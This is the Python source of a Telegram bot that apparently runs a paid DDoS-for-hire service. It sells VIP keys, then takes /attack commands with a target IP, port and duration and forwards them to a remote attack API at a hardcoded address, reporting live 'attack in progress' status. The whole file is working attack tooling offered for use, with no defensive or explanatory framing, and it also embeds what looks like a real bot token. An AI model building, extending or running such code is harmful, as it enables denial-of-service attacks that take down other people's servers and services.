import telebot
import requests
import time
import random
import string
import json
import os
import threading

# --- CONFIGURATION ---
TOKEN = "8605810780:AAHpOMnTfgzviFfbHIk2du8S7tAJKseaNzY"
ADMIN_ID = 8787952549
API_BASE = "http://13.203.155.253/attack"
API_KEY_DDoS = "DESTRUCTED"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

active_attacks = []
MAX_CONCURRENT = 2

def load_db(file):
    if os.path.exists(file):
        try:
            with open(file, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(file, data):
    with open(file, "w") as f: json.dump(data, f, indent=4)

users = load_db("users.json")
keys = load_db("keys.json")

def get_progress_bar(remaining, total):
    filled = int(((total - remaining) / total) * 10)
    bar = "▓" * filled + "░" * (10 - filled)
    return f"[{bar}] {int(((total - remaining) / total) * 100)}%"

def send_attack_request(target, port, duration):
    try:
        response = requests.get(
            API_BASE, 
            params={"ip": target, "port": port, "time": duration, "key": API_KEY_DDoS},
            timeout=15
        )
        return response.status_code == 200
    except: return False

def update_progress(chat_id, msg_id, target, port, duration):
    start_time = time.time()
    success = send_attack_request(target, port, duration)
    
    if not success:
        bot.edit_message_text("❌ **API SERVER ERROR**\nCheck API status or key.", chat_id, msg_id)
        global active_attacks
        active_attacks = [a for a in active_attacks if a['target'] != target]
        return

    while time.time() - start_time < duration:
        rem = int(duration - (time.time() - start_time))
        progress = get_progress_bar(rem, duration)
        try:
            bot.edit_message_text(
                f"🚀 **ATTACK IN PROGRESS** 🚀\n━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 **TARGET:** `{target}:{port}`\n"
                f"⏳ **TIME:** `{rem}s`\n"
                f"📊 **PROGRESS:** `{progress}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"💥 **POWERED BY SASTA DEVELOPER**",
                chat_id, msg_id
            )
        except: break
        time.sleep(5)
    
    try:
        bot.edit_message_text(f"✅ **ATTACK COMPLETE**\nTarget `{target}` successfully finished.", chat_id, msg_id)
    except: pass
    active_attacks[:] = [a for a in active_attacks if a['target'] != target]

@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
    if uid not in users: users[uid] = {"expiry": 0, "username": uname}
    save_db("users.json", users)

    slots = f"{len(active_attacks)}/{MAX_CONCURRENT}"
    role = "👑 ADMIN" if int(uid) == ADMIN_ID else "⭐ VIP" if users[uid]['expiry'] > time.time() else "🆓 FREE"
    
    dashboard = (
        "🚀 **SASTA DEVELOPER TERMINAL** 🚀\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **USER:** `{message.from_user.first_name}`\n"
        f"💳 **PLAN:** `{role}`\n"
        f"🛰️ **SLOTS:** `{slots}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🛠️ **TERMINAL COMMANDS:**\n"
        "👉 `/attack` - Stress Target\n"
        "👉 `/running` - Live Attacks\n"
        "👉 `/redeem` - Activate Key\n"
        "👉 `/myid` - Your Info\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "👑 **OWNER:** @sastadeveloper"
    )
    bot.send_message(message.chat.id, dashboard)

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    uid = str(message.from_user.id)
    if users.get(uid, {}).get('expiry', 0) < time.time() and int(uid) != ADMIN_ID:
        bot.reply_to(message, "🚫 **VIP REQUIRED**\nRedeem a key first."); return
    if len(active_attacks) >= MAX_CONCURRENT:
        bot.reply_to(message, "⚠️ **SLOTS FULL**"); return

    try:
        args = message.text.split()
        target, port, duration = args[1], args[2], int(args[3])
        active_attacks.append({"target": target, "end_time": time.time() + duration})
        msg = bot.send_message(message.chat.id, "🛰️ **Initializing Terminal...**")
        threading.Thread(target=update_progress, args=(message.chat.id, msg.message_id, target, port, duration)).start()
    except:
        bot.send_message(message.chat.id, "📝 **Usage:** `/attack <IP> <PORT> <TIME>`")

@bot.message_handler(commands=['running'])
def running(message):
    active_attacks[:] = [a for a in active_attacks if a['end_time'] > time.time()]
    if not active_attacks:
        bot.reply_to(message, "✨ **No active attacks.**"); return
    txt = f"🔥 **LIVE SLOTS: {len(active_attacks)}/{MAX_CONCURRENT}**\n\n"
    for a in active_attacks:
        rem = int(a['end_time'] - time.time())
        txt += f"🚀 `{a['target']}` | `{rem}s` left\n"
    bot.send_message(message.chat.id, txt)

@bot.message_handler(commands=['genkey'])
def genkey(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        days, count = int(args[1]), int(args[2])
        new_keys = []
        for _ in range(count):
            k = "SD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            keys[k] = {"duration": days * 86400, "used_by": None}
            new_keys.append(k)
        save_db("keys.json", keys)
        bot.send_message(message.chat.id, f"🎫 **KEYS:**\n`" + "\n".join(new_keys) + "`")
    except: bot.reply_to(message, "Usage: `/genkey 1 5`")

@bot.message_handler(commands=['redeem'])
def redeem(message):
    uid = str(message.from_user.id)
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "📝 **Usage:** `/redeem <KEY>`")
            return
        k = parts[1]
        if k in keys and keys[k]['used_by'] is None:
            users[uid]['expiry'] = max(users.get(uid, {}).get('expiry', 0), time.time()) + keys[k]['duration']
            keys[k]['used_by'] = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
            save_db("users.json", users); save_db("keys.json", keys)
            bot.reply_to(message, "👑 **VIP ACTIVATED!**")
        else:
            bot.reply_to(message, "❌ **Invalid or Used Key.**")
    except: bot.reply_to(message, "⚠️ Redeem error.")

print("v10.7 RAILWAY STABLE ONLINE...")
bot.infinity_polling()
